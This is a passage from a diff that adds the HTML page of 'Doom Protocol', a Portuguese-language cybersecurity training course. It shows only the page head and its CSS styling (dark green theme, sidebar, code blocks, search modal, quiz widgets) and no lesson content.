@@ -1,0 +1,4947 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Doom Protocol — sistema de treinamento de cibersegurança operacional, do zero ao profissional, com 17 módulos de teoria, código e projetos práticos.">
+<title>DOOM PROTOCOL | Curso de Cibersegurança</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/base16/eighties.min.css">
+<style>
+:root {
+  --doom-bg-primary: #0a0f0a;
+  --doom-bg-secondary: #0d1f0d;
+  --doom-bg-elevated: #142614;
+  --doom-accent: #1a5c1a;
+  --doom-highlight: #2ecc40;
+  --doom-glow: rgba(46, 204, 64, 0.15);
+  --doom-metal: #4a5568;
+  --doom-gold: #b8860b;
+  --doom-text-primary: #e2e8e0;
+  --doom-text-secondary: #718a71;
+  --doom-danger: #8b0000;
+  --doom-border: rgba(46, 204, 64, 0.25);
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: 'Inter', sans-serif;
+  background: var(--doom-bg-primary);
+  color: var(--doom-text-primary);
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+
+/* Grid background */
+body::before {
+  content: '';
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background-image:
+    linear-gradient(rgba(20, 38, 20, 0.3) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(20, 38, 20, 0.3) 1px, transparent 1px);
+  background-size: 40px 40px;
+  pointer-events: none;
+  z-index: 0;
+}
+
+/* Scanline effect */
+body::after {
+  content: '';
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: repeating-linear-gradient(
+    0deg,
+    transparent,
+    transparent 2px,
+    rgba(0,0,0,0.15) 2px,
+    rgba(0,0,0,0.15) 4px
+  );
+  pointer-events: none;
+  z-index: 9999;
+  opacity: 0.4;
+}
+
+/* Scrollbar */
+::-webkit-scrollbar { width: 8px; }
+::-webkit-scrollbar-track { background: var(--doom-bg-primary); }
+::-webkit-scrollbar-thumb { background: var(--doom-accent); border-radius: 4px; }
+::-webkit-scrollbar-thumb:hover { background: var(--doom-highlight); }
+
+/* Selection */
+::selection { background: var(--doom-highlight); color: #000; }
+
+/* Focus visibility (acessibilidade) */
+a:focus-visible, button:focus-visible, input:focus-visible {
+  outline: 2px solid var(--doom-highlight);
+  outline-offset: 2px;
+}
+
+/* Header */
+header {
+  position: fixed;
+  top: 0; left: 0; right: 0;
+  height: 64px;
+  background: rgba(10, 15, 10, 0.92);
+  backdrop-filter: blur(12px);
+  border-bottom: 1px solid var(--doom-border);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 32px;
+  z-index: 1000;
+}
+
+.header-left {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+}
+
+.menu-toggle {
+  display: none;
+  background: transparent;
+  border: 1px solid var(--doom-border);
+  border-radius: 2px 8px 2px 8px;
+  color: var(--doom-highlight);
+  width: 38px;
+  height: 38px;
+  cursor: pointer;
+  align-items: center;
+  justify-content: center;
+}
+
+.menu-toggle svg { width: 18px; height: 18px; }
+
+.logo {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 1.3rem;
+  font-weight: 800;
+  color: var(--doom-highlight);
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.logo-emblem {
+  width: 30px;
+  height: 30px;
+  flex-shrink: 0;
+  filter: drop-shadow(0 0 6px rgba(46, 204, 64, 0.5));
+}
+
+.logo span { color: var(--doom-text-secondary); font-weight: 400; font-size: 0.75rem; }
+
+.nav-links {
+  display: flex;
+  gap: 28px;
+  list-style: none;
+}
+
+.nav-links a {
+  color: var(--doom-text-secondary);
+  text-decoration: none;
+  font-size: 0.8rem;
+  font-weight: 500;
+  letter-spacing: 0.05em;
+  text-transform: uppercase;
+  transition: all 0.3s ease;
+  position: relative;
+  padding: 4px 0;
+}
+
+.nav-links a::after {
+  content: '';
+  position: absolute;
+  bottom: -2px;
+  left: 0;
+  width: 0;
+  height: 2px;
+  background: var(--doom-highlight);
+  box-shadow: 0 0 8px var(--doom-glow);
+  transition: width 0.3s ease;
+}
+
+.nav-links a:hover { color: var(--doom-highlight); }
+.nav-links a:hover::after { width: 100%; }
+
+.nav-links a.active { color: var(--doom-highlight); }
+.nav-links a.active::after { width: 100%; }
+
+.status-badge {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.7rem;
+  color: var(--doom-highlight);
+  border: 1px solid var(--doom-accent);
+  padding: 4px 12px;
+  border-radius: 2px 8px 2px 8px;
+  background: rgba(46, 204, 64, 0.05);
+  animation: pulse 3s infinite;
+}
+
+@keyframes pulse {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.6; }
+}
+
+/* Layout */
+.container {
+  display: flex;
+  margin-top: 64px;
+  position: relative;
+  z-index: 1;
+}
+
+/* Sidebar */
+.sidebar {
+  position: fixed;
+  top: 64px;
+  left: 0;
+  width: 280px;
+  height: calc(100vh - 64px);
+  background: rgba(13, 31, 13, 0.95);
+  border-right: 1px solid var(--doom-border);
+  overflow-y: auto;
+  padding: 24px 0;
+  z-index: 100;
+  transition: transform 0.3s ease;
+}
+
+.sidebar-title {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 0.7rem;
+  color: var(--doom-metal);
+  text-transform: uppercase;
+  letter-spacing: 0.15em;
+  padding: 0 24px 16px;
+  border-bottom: 1px solid rgba(74, 85, 104, 0.3);
+  margin-bottom: 8px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+.overall-progress {
+  padding: 4px 24px 18px;
+  border-bottom: 1px solid rgba(74, 85, 104, 0.3);
+  margin-bottom: 8px;
+}
+
+.overall-progress-label {
+  display: flex;
+  justify-content: space-between;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.65rem;
+  color: var(--doom-text-secondary);
+  margin-bottom: 6px;
+}
+
+.overall-progress-label span:last-child { color: var(--doom-highlight); }
+
+.sidebar-nav { list-style: none; }
+
+.sidebar-nav li { position: relative; }
+
+.sidebar-nav a {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 10px 24px;
+  color: var(--doom-text-secondary);
+  text-decoration: none;
+  font-size: 0.82rem;
+  font-weight: 500;
+  transition: all 0.25s ease;
+  border-left: 3px solid transparent;
+}
+
+.sidebar-nav a::before {
+  content: '›';
+  font-family: 'Orbitron', sans-serif;
+  color: var(--doom-accent);
+  font-size: 0.9rem;
+  transition: all 0.25s ease;
+}
+
+.sidebar-nav a:hover,
+.sidebar-nav a.active {
+  background: rgba(46, 204, 64, 0.06);
+  color: var(--doom-highlight);
+  border-left-color: var(--doom-highlight);
+}
+
+.sidebar-nav a:hover::before,
+.sidebar-nav a.active::before {
+  color: var(--doom-highlight);
+  transform: translateX(4px);
+}
+
+.mod-number {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.65rem;
+  color: var(--doom-gold);
+  background: rgba(184, 134, 11, 0.1);
+  padding: 2px 6px;
+  border-radius: 2px;
+  margin-left: auto;
+}
+
+.mod-check {
+  width: 16px;
+  height: 16px;
+  border: 1px solid var(--doom-metal);
+  border-radius: 3px;
+  flex-shrink: 0;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 0.6rem;
+  color: transparent;
+  cursor: pointer;
+  transition: all 0.2s ease;
+  background: transparent;
+  padding: 0;
+}
+
+.mod-check:hover { border-color: var(--doom-highlight); }
+
+.mod-check.done {
+  background: var(--doom-highlight);
+  border-color: var(--doom-highlight);
+  color: #04140a;
+}
+
+/* Sidebar overlay for mobile */
+.sidebar-overlay {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.6);
+  z-index: 90;
+}
+
+/* Main content */
+main {
+  margin-left: 280px;
+  flex: 1;
+  padding: 40px 48px;
+  max-width: calc(100vw - 280px);
+}
+
+/* Hero */
+.hero {
+  text-align: center;
+  padding: 80px 20px 60px;
+  border-bottom: 1px solid var(--doom-border);
+  margin-bottom: 48px;
+  position: relative;
+}
+
+.hero::before {
+  content: '';
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  width: 500px;
+  height: 500px;
+  background: radial-gradient(circle, rgba(46,204,64,0.08) 0%, transparent 70%);
+  pointer-events: none;
+}
+
+.hero-emblem {
+  width: 88px;
+  height: 88px;
+  margin: 0 auto 24px;
+  filter: drop-shadow(0 0 18px rgba(46, 204, 64, 0.35));
+  position: relative;
+  z-index: 1;
+}
+
+.hero h1 {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 3.2rem;
+  font-weight: 900;
+  color: var(--doom-highlight);
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  margin-bottom: 16px;
+  text-shadow: 0 0 30px rgba(46, 204, 64, 0.3);
+  position: relative;
+}
+
+.hero-sub {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 1rem;
+  color: var(--doom-text-secondary);
+  margin-bottom: 32px;
+  letter-spacing: 0.05em;
+}
+
+.hero-desc {
+  max-width: 700px;
+  margin: 0 auto;
+  color: var(--doom-text-secondary);
+  font-size: 1.05rem;
+  line-height: 1.8;
+}
+
+.hero-badges {
+  display: flex;
+  justify-content: center;
+  gap: 16px;
+  margin-top: 32px;
+  flex-wrap: wrap;
+}
+
+.badge {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.7rem;
+  padding: 6px 14px;
+  border: 1px solid var(--doom-border);
+  border-radius: 2px 8px 2px 8px;
+  color: var(--doom-text-secondary);
+  background: rgba(20, 38, 20, 0.5);
+}
+
+.badge.gold { border-color: var(--doom-gold); color: var(--doom-gold); background: rgba(184,134,11,0.08); }
+
+/* Section */
+.section {
+  margin-bottom: 64px;
+  scroll-margin-top: 80px;
+}
+
+.section-header {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  margin-bottom: 32px;
+  padding-bottom: 16px;
+  border-bottom: 1px solid;
+  border-image: linear-gradient(90deg, var(--doom-highlight), transparent) 1;
+}
+
+.section-header h2 {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 1.6rem;
+  font-weight: 700;
+  color: var(--doom-highlight);
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+}
+
+.section-tag {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.65rem;
+  padding: 4px 10px;
+  border: 1px solid var(--doom-accent);
+  color: var(--doom-highlight);
+  border-radius: 2px;
+  text-transform: uppercase;
+}
+
+.section-tag.danger { border-color: var(--doom-danger); color: #ff4444; }
+.section-tag.gold { border-color: var(--doom-gold); color: var(--doom-gold); }
+
+.est-time {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.65rem;
+  color: var(--doom-text-secondary);
+  white-space: nowrap;
+}
+
+/* Module progress bar in section header */
+.section-progress {
+  margin-left: auto;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.section-progress .progress-wrap {
+  width: 90px;
+  margin: 0;
+}
+
+.mark-complete-btn {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.65rem;
+  padding: 6px 12px;
+  border: 1px solid var(--doom-accent);
+  background: transparent;
+  color: var(--doom-text-secondary);
+  border-radius: 2px 8px 2px 8px;
+  cursor: pointer;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+  transition: all 0.2s ease;
+  white-space: nowrap;
+}
+
+.mark-complete-btn:hover {
+  border-color: var(--doom-highlight);
+  color: var(--doom-highlight);
+}
+
+.mark-complete-btn.done {
+  background: rgba(46, 204, 64, 0.12);
+  border-color: var(--doom-highlight);
+  color: var(--doom-highlight);
+}
+
+/* Cards */
+.card {
+  background: var(--doom-bg-secondary);
+  border: 1px solid rgba(46, 204, 64, 0.15);
+  border-radius: 2px 12px 2px 12px;
+  padding: 28px 32px;
+  margin-bottom: 24px;
+  position: relative;
+  transition: all 0.3s ease;
+}
+
+.card::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0;
+  width: 3px; height: 100%;
+  background: linear-gradient(180deg, var(--doom-highlight), transparent);
+  opacity: 0.6;
+}
+
+.card:hover {
+  border-color: var(--doom-border);
+  box-shadow: 0 0 24px rgba(46, 204, 64, 0.08);
+  transform: translateY(-2px);
+}
+
+.card h3 {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 1.1rem;
+  color: var(--doom-text-primary);
+  margin-bottom: 16px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.card h3::before {
+  content: '▸';
+  color: var(--doom-highlight);
+}
+
+.card p, .card li {
+  color: var(--doom-text-secondary);
+  font-size: 0.95rem;
+}
+
+.card ul { padding-left: 20px; margin: 12px 0; }
+.card li { margin-bottom: 8px; }
+
+/* External practice link chip */
+.practice-link {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  margin-top: 12px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.72rem;
+  color: var(--doom-highlight);
+  text-decoration: none;
+  border: 1px solid var(--doom-accent);
+  padding: 5px 12px;
+  border-radius: 2px 8px 2px 8px;
+  transition: all 0.2s ease;
+}
+
+.practice-link:hover {
+  background: rgba(46, 204, 64, 0.08);
+  border-color: var(--doom-highlight);
+}
+
+/* Tables */
+.table-wrap {
+  overflow-x: auto;
+  margin: 24px 0;
+  border: 1px solid rgba(46, 204, 64, 0.15);
+  border-radius: 2px 12px 2px 12px;
+}
+
+table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 0.9rem;
+}
+
+thead {
+  background: var(--doom-bg-elevated);
+}
+
+th {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 0.72rem;
+  font-weight: 600;
+  color: var(--doom-highlight);
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  padding: 14px 18px;
+  text-align: left;
+  border-bottom: 2px solid var(--doom-accent);
+}
+
+td {
+  padding: 12px 18px;
+  color: var(--doom-text-secondary);
+  border-bottom: 1px solid rgba(46, 204, 64, 0.08);
+}
+
+tr:hover td {
+  background: rgba(46, 204, 64, 0.04);
+  color: var(--doom-text-primary);
+}
+
+/* Code blocks */
+pre {
+  background: #070c07;
+  border: 1px solid rgba(46, 204, 64, 0.2);
+  border-radius: 2px 10px 2px 10px;
+  padding: 20px 24px;
+  overflow-x: auto;
+  margin: 20px 0;
+  position: relative;
+}
+
+pre::before {
+  content: attr(data-lang);
+  position: absolute;
+  top: 0; right: 48px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.6rem;
+  color: var(--doom-metal);
+  background: rgba(20, 38, 20, 0.8);
+  padding: 4px 10px;
+  border-bottom-left-radius: 8px;
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+}
+
+.copy-btn {
+  position: absolute;
+  top: 0; right: 0;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.62rem;
+  color: var(--doom-text-secondary);
+  background: rgba(20, 38, 20, 0.8);
+  border: none;
+  border-bottom-left-radius: 8px;
+  padding: 4px 10px;
+  cursor: pointer;
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  transition: color 0.2s ease;
+}
+
+.copy-btn:hover { color: var(--doom-highlight); }
+.copy-btn.copied { color: var(--doom-highlight); }
+
+code {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.85rem;
+  line-height: 1.6;
+}
+
+pre code {
+  color: #a8c5a8;
+  display: block;
+  background: transparent !important;
+}
+
+pre code.hljs { padding: 0; }
+
+/* Inline code */
+p code, li code, td code {
+  background: rgba(46, 204, 64, 0.08);
+  color: var(--doom-highlight);
+  padding: 2px 6px;
+  border-radius: 3px;
+  font-size: 0.85em;
+}
+
+/* Blockquote / Alert */
+.alert {
+  background: rgba(46, 204, 64, 0.05);
+  border-left: 3px solid var(--doom-highlight);
+  padding: 16px 20px;
+  margin: 20px 0;
+  border-radius: 0 8px 8px 0;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.88rem;
+  color: var(--doom-text-secondary);
+}
+
+.alert.danger {
+  background: rgba(139, 0, 0, 0.08);
+  border-left-color: var(--doom-danger);
+  color: #c0a0a0;
+}
+
+.alert.gold {
+  background: rgba(184, 134, 11, 0.06);
+  border-left-color: var(--doom-gold);
+  color: #c4b896;
+}
+
+/* Lists styling */
+.content-list {
+  list-style: none;
+  padding: 0;
+}
+
+.content-list li {
+  padding: 8px 0 8px 24px;
+  position: relative;
+  color: var(--doom-text-secondary);
+}
+
+.content-list li::before {
+  content: '›';
+  position: absolute;
+  left: 0;
+  color: var(--doom-highlight);
+  font-weight: bold;
+}
+
+/* Terminal effect for some blocks */
+.terminal {
+  background: #050805;
+  border: 1px solid rgba(46, 204, 64, 0.25);
+  border-radius: 2px 10px 2px 10px;
+  padding: 20px 24px;
+  margin: 20px 0;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.85rem;
+  color: var(--doom-highlight);
+  position: relative;
+}
+
+.terminal::before {
+  content: 'root@doom-protocol:~# ';
+  color: var(--doom-gold);
+  opacity: 0.8;
+}
+
+/* Progress bar */
+.progress-wrap {
+  background: var(--doom-bg-primary);
+  border: 1px solid rgba(46, 204, 64, 0.2);
+  border-radius: 2px;
+  height: 8px;
+  margin: 12px 0;
+  overflow: hidden;
+}
+
+.progress-fill {
+  height: 100%;
+  background: linear-gradient(90deg, var(--doom-accent), var(--doom-highlight));
+  box-shadow: 0 0 10px rgba(46, 204, 64, 0.4);
+  transition: width 0.6s ease;
+}
+
+/* Module grid (índice geral interativo) */
+.module-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(210px, 1fr));
+  gap: 16px;
+}
+
+.module-card {
+  position: relative;
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+  background: var(--doom-bg-secondary);
+  border: 1px solid rgba(46, 204, 64, 0.15);
+  border-radius: 2px 12px 2px 12px;
+  padding: 20px 20px 18px;
+  text-decoration: none;
+  color: inherit;
+  overflow: hidden;
+  cursor: pointer;
+  transition: transform 0.25s ease, border-color 0.25s ease, box-shadow 0.25s ease;
+  transform-style: preserve-3d;
+  will-change: transform;
+}
+
+.module-card::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0;
+  width: 3px; height: 100%;
+  background: linear-gradient(180deg, var(--doom-highlight), transparent);
+  opacity: 0.5;
+  transition: opacity 0.25s ease;
+}
+
+.module-card::after {
+  content: '';
+  position: absolute;
+  inset: 0;
+  background: radial-gradient(circle at var(--mx, 50%) var(--my, 50%), rgba(46,204,64,0.14), transparent 60%);
+  opacity: 0;
+  transition: opacity 0.3s ease;
+  pointer-events: none;
+}
+
+.module-card:hover {
+  border-color: var(--doom-border);
+  box-shadow: 0 10px 30px rgba(0,0,0,0.35), 0 0 24px rgba(46, 204, 64, 0.12);
+}
+
+.module-card:hover::before { opacity: 1; }
+.module-card:hover::after { opacity: 1; }
+
+.module-card-num {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 1.6rem;
+  font-weight: 800;
+  color: var(--doom-highlight);
+  opacity: 0.85;
+}
+
+.module-card-title {
+  font-size: 0.92rem;
+  font-weight: 600;
+  color: var(--doom-text-primary);
+  line-height: 1.35;
+  flex: 1;
+}
+
+.module-card .section-tag { align-self: flex-start; }
+
+.module-card-check {
+  position: absolute;
+  top: 16px; right: 16px;
+  width: 20px; height: 20px;
+  border: 1px solid var(--doom-metal);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 0.65rem;
+  color: transparent;
+  transition: all 0.2s ease;
+  background: transparent;
+  padding: 0;
+}
+
+.module-card-check.done {
+  background: var(--doom-highlight);
+  border-color: var(--doom-highlight);
+  color: #04140a;
+  box-shadow: 0 0 10px rgba(46, 204, 64, 0.5);
+}
+
+/* Scroll reveal */
+.reveal {
+  opacity: 0;
+  transform: translateY(28px);
+  transition: opacity 0.7s cubic-bezier(.21,.9,.32,1), transform 0.7s cubic-bezier(.21,.9,.32,1);
+}
+
+.reveal.in-view {
+  opacity: 1;
+  transform: translateY(0);
+}
+
+/* Hero boot sequence */
+.boot-sequence {
+  max-width: 460px;
+  margin: 28px auto 0;
+  text-align: left;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.78rem;
+  color: var(--doom-text-secondary);
+  min-height: 90px;
+}
+
+.boot-line {
+  opacity: 0;
+  margin-bottom: 6px;
+  white-space: pre-wrap;
+}
+
+.boot-line.shown { opacity: 1; }
+
+.boot-line .ok { color: var(--doom-highlight); }
+
+.boot-cursor {
+  display: inline-block;
+  width: 7px; height: 14px;
+  background: var(--doom-highlight);
+  vertical-align: middle;
+  margin-left: 2px;
+  animation: blink 0.9s step-end infinite;
+}
+
+@keyframes blink { 50% { opacity: 0; } }
+
+/* Status badge stronger pulse */
+.status-badge {
+  transition: box-shadow 0.3s ease;
+}
+
+/* Button press feedback */
+.mark-complete-btn, .copy-btn, .menu-toggle, .back-to-top, .module-card {
+  -webkit-tap-highlight-color: transparent;
+}
+
+.mark-complete-btn:active, .copy-btn:active { transform: scale(0.94); }
+
+.mark-complete-btn.done {
+  animation: doneFlash 0.5s ease;
+}
+
+@keyframes doneFlash {
+  0% { box-shadow: 0 0 0 0 rgba(46, 204, 64, 0.6); }
+  100% { box-shadow: 0 0 0 12px rgba(46, 204, 64, 0); }
+}
+
+/* Progress fill shimmer */
+.progress-fill {
+  position: relative;
+  overflow: hidden;
+}
+
+.progress-fill::after {
+  content: '';
+  position: absolute;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
+  animation: shimmer 2.2s linear infinite;
+}
+
+@keyframes shimmer {
+  0% { transform: translateX(-100%); }
+  100% { transform: translateX(100%); }
+}
+
+/* Card tilt hint (subtle continuous float on hero emblem) */
+@keyframes float {
+  0%, 100% { transform: translateY(0); }
+  50% { transform: translateY(-6px); }
+}
+
+.hero-emblem { animation: float 4s ease-in-out infinite; }
+
+@media (prefers-reduced-motion: reduce) {
+  .reveal { opacity: 1 !important; transform: none !important; }
+  .hero-emblem { animation: none !important; }
+  .progress-fill::after { animation: none !important; }
+}
+
+/* Header right / search trigger */
+.header-right {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+}
+
+.search-trigger {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  background: rgba(20, 38, 20, 0.5);
+  border: 1px solid var(--doom-border);
+  border-radius: 2px 8px 2px 8px;
+  color: var(--doom-text-secondary);
+  padding: 7px 10px;
+  cursor: pointer;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.72rem;
+  transition: all 0.2s ease;
+}
+
+.search-trigger svg { width: 15px; height: 15px; flex-shrink: 0; }
+
+.search-trigger:hover {
+  border-color: var(--doom-highlight);
+  color: var(--doom-highlight);
+}
+
+.search-trigger kbd {
+  background: rgba(46, 204, 64, 0.08);
+  border: 1px solid var(--doom-border);
+  border-radius: 3px;
+  padding: 1px 5px;
+  font-size: 0.62rem;
+  color: var(--doom-metal);
+}
+
+@media (max-width: 640px) {
+  .search-trigger-label, .search-trigger kbd { display: none; }
+  .search-trigger { padding: 8px; }
+}
+
+/* Search overlay / modal */
+.search-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(5, 10, 5, 0.75);
+  backdrop-filter: blur(4px);
+  z-index: 2000;
+  display: none;
+  align-items: flex-start;
+  justify-content: center;
+  padding: 12vh 20px 20px;
+}
+
+.search-overlay.open { display: flex; }
+
+.search-modal {
+  width: 100%;
+  max-width: 620px;
+  background: var(--doom-bg-secondary);
+  border: 1px solid var(--doom-border);
+  border-radius: 2px 16px 2px 16px;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.6), 0 0 40px rgba(46, 204, 64, 0.1);
+  overflow: hidden;
+  animation: searchPop 0.2s ease;
+}
+
+@keyframes searchPop {
+  from { opacity: 0; transform: translateY(-10px) scale(0.98); }
+  to { opacity: 1; transform: translateY(0) scale(1); }
+}
+
+.search-input-wrap {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 16px 20px;
+  border-bottom: 1px solid var(--doom-border);
+}
+
+.search-input-wrap svg { width: 18px; height: 18px; color: var(--doom-highlight); flex-shrink: 0; }
+
+.search-input-wrap input {
+  flex: 1;
+  background: transparent;
+  border: none;
+  outline: none;
+  color: var(--doom-text-primary);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.95rem;
+}
+
+.search-input-wrap input::placeholder { color: var(--doom-text-secondary); }
+
+.search-input-wrap kbd {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.65rem;
+  color: var(--doom-metal);
+  border: 1px solid var(--doom-border);
+  border-radius: 3px;
+  padding: 2px 6px;
+  flex-shrink: 0;
+}
+
+.search-results {
+  max-height: 60vh;
+  overflow-y: auto;
+  padding: 8px;
+}
+
+.search-empty {
+  padding: 32px 20px;
+  text-align: center;
+  color: var(--doom-text-secondary);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.82rem;
+}
+
+.search-result {
+  display: block;
+  width: 100%;
+  text-align: left;
+  padding: 12px 14px;
+  border-radius: 2px 10px 2px 10px;
+  text-decoration: none;
+  color: inherit;
+  cursor: pointer;
+  border-left: 3px solid transparent;
+  background: transparent;
+  border-top: none; border-right: none; border-bottom: none;
+  font: inherit;
+  transition: background 0.15s ease, border-color 0.15s ease;
+}
+
+.search-result:hover, .search-result.selected {
+  background: rgba(46, 204, 64, 0.08);
+  border-left-color: var(--doom-highlight);
+}
+
+.search-result-title {
+  font-weight: 600;
+  color: var(--doom-text-primary);
+  font-size: 0.92rem;
+  margin-bottom: 3px;
+}
+
+.search-result-title mark {
+  background: rgba(46, 204, 64, 0.35);
+  color: var(--doom-highlight);
+  border-radius: 2px;
+  padding: 0 1px;
+}
+
+.search-result-meta {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.68rem;
+  color: var(--doom-gold);
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+  margin-bottom: 4px;
+}
+
+.search-result-snippet {
+  font-size: 0.8rem;
+  color: var(--doom-text-secondary);
+  line-height: 1.5;
+}
+
+.search-result-snippet mark {
+  background: rgba(46, 204, 64, 0.35);
+  color: var(--doom-highlight);
+  border-radius: 2px;
+  padding: 0 1px;
+}
+
+/* Flash highlight when jumping to a result */
+@keyframes jumpFlash {
+  0% { box-shadow: 0 0 0 0 rgba(46, 204, 64, 0.7); border-color: var(--doom-highlight); }
+  100% { box-shadow: 0 0 0 18px rgba(46, 204, 64, 0); border-color: rgba(46, 204, 64, 0.15); }
+}
+
+.jump-flash { animation: jumpFlash 1.4s ease; }
+
+/* Quiz */
+.quiz-card { border-color: rgba(184, 134, 11, 0.25); }
+.quiz-card::before { background: linear-gradient(180deg, var(--doom-gold), transparent); }
+
+.quiz-question {
+  margin-bottom: 22px;
+  padding-bottom: 20px;
+  border-bottom: 1px solid rgba(46, 204, 64, 0.1);
+}
+
+.quiz-question:last-of-type { border-bottom: none; margin-bottom: 8px; padding-bottom: 0; }
+
+.quiz-question-text {
+  color: var(--doom-text-primary);
+  font-weight: 600;
+  font-size: 0.95rem;
+  margin-bottom: 12px;
+}
+
+.quiz-options { display: flex; flex-direction: column; gap: 8px; }
+
+.quiz-option {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  width: 100%;
+  padding: 10px 14px;
+  border: 1px solid rgba(46, 204, 64, 0.15);
+  border-radius: 2px 8px 2px 8px;
+  cursor: pointer;
+  font-size: 0.88rem;
+  color: var(--doom-text-secondary);
+  background: transparent;
+  font-family: inherit;
+  text-align: left;
+  transition: all 0.15s ease;
+}
+
+.quiz-option:hover { border-color: var(--doom-highlight); color: var(--doom-text-primary); }
+
+.quiz-option.selected {
+  border-color: var(--doom-highlight);
+  background: rgba(46, 204, 64, 0.06);
+  color: var(--doom-text-primary);
+}
+
+.quiz-option-marker {
+  width: 16px; height: 16px;
+  border-radius: 50%;
+  border: 1px solid var(--doom-metal);
+  flex-shrink: 0;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 0.6rem;
+}
+
+.quiz-option.selected .quiz-option-marker { border-color: var(--doom-highlight); background: var(--doom-highlight); color: #04140a; }
+
+.quiz-option.correct {
+  border-color: var(--doom-highlight);
+  background: rgba(46, 204, 64, 0.12);
+}
+
+.quiz-option.correct .quiz-option-marker { border-color: var(--doom-highlight); background: var(--doom-highlight); color: #04140a; }
+
+.quiz-option.wrong {
+  border-color: var(--doom-danger);
+  background: rgba(139, 0, 0, 0.1);
+}
+
+.quiz-option.wrong .quiz-option-marker { border-color: #ff4444; background: #ff4444; color: #1a0000; }
+
+.quiz-option.disabled { cursor: default; }
+
+.quiz-explain {
+  margin-top: 10px;
+  font-size: 0.82rem;
+  color: var(--doom-text-secondary);
+  font-family: 'JetBrains Mono', monospace;
+  padding: 8px 12px;
+  background: rgba(20, 38, 20, 0.5);
+  border-radius: 0 6px 6px 0;
+  border-left: 2px solid var(--doom-gold);
+  display: none;
+}
+
+.quiz-explain.shown { display: block; }
+
+.quiz-submit-btn {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.78rem;
+  padding: 10px 18px;
+  border: 1px solid var(--doom-gold);
+  background: rgba(184, 134, 11, 0.08);
+  color: var(--doom-gold);
+  border-radius: 2px 8px 2px 8px;
+  cursor: pointer;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+  transition: all 0.2s ease;
+}
+
+.quiz-submit-btn:hover { background: rgba(184, 134, 11, 0.18); }
